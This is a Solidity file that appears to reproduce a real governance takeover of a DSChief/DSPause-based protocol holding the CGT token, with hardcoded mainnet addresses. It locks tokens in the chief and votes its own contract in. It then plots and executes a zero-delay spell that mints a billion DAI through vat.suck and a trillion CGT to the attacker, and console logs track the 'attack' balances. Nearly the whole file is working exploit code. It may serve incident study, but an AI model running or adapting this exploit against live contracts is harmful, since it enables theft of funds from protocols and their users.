pragma solidity ^0.8.24;

import "./Interfaces.sol";
import "forge-std/console.sol";
import "./ds-contracts/Chief/chief.sol";
import "./ds-contracts/pause.sol";

// Contract used by the attacker to get outstanding CGT balance
// The contract is verified at https://etherscan.io/address/0x1e791527aea32cddbd7ceb7f04612db536816545#code
contract Action {
    IDSChief public chief = IDSChief(0x579A3244f38112b8AAbefcE0227555C9b6e7aaF0);
    DSPause public pause = DSPause(0x1e692eF9cF786Ed4534d5Ca11EdBa7709602c69f);
    Spell spell;

    address public pans; // the attacker named the deployer after pans

    constructor() {
        pans = msg.sender;
    }

    modifier onlyPans() {
        require(pans == msg.sender, "not pans");
        _;
    }

    function cook(address _cgt, uint256 amount, uint256 wethMin, uint256 daiMin) external onlyPans {
        IERC20 cgt = IERC20(_cgt);
        cgt.transferFrom(msg.sender, address(this), amount);
        console.log("Balance of CGT");
        console.log("Before the attack: %s", cgt.balanceOf(address(this)));

        cgt.approve(address(chief), amount);

        chief.lock(amount);
        console.log("After locking in chief: %s", cgt.balanceOf(address(this)));

        address[] memory _yays = new address[](1);
        _yays[0] = address(this);
        chief.vote(_yays);
        chief.lift(address(this));

        spell = new Spell();
        address spellAddr = address(spell);
        bytes32 tag;
        assembly {
            tag := extcodehash(spellAddr)
        }

        bytes memory funcSig = abi.encodeWithSignature("act(address,address)", address(this), address(cgt));
        uint256 delay = block.timestamp + 0;

        pause.plot(spellAddr, tag, funcSig, delay);
        pause.exec(spellAddr, tag, funcSig, delay);

        console.log("End of attack: %s", cgt.balanceOf(address(this)));
    }
}

contract Spell {
    function act(address user, IMERC20 cgt) public {
        IVat vat = IVat(0x8B2B0c101adB9C3654B226A3273e256a74688E57);
        IJoin daiJoin = IJoin(0xE35Fc6305984a6811BD832B0d7A2E6694e37dfaF);

        vat.suck(address(this), address(this), 10 ** 9 * 10 ** 18 * 10 ** 27);

        vat.hope(address(daiJoin));
        daiJoin.exit(user, 10 ** 9 * 1 ether);

        cgt.mint(user, 10 ** 12 * 1 ether);
    }

    // Methods in attacker's spell. Used later on to perform the swaps.
    // Not strictly required for the attack.
    function clean(IMERC20 cgt) external {
        // Anti-mev
        cgt.stop();
    }

    function cleanToo(IMERC20 cgt) external {
        cgt.start();
    }
}
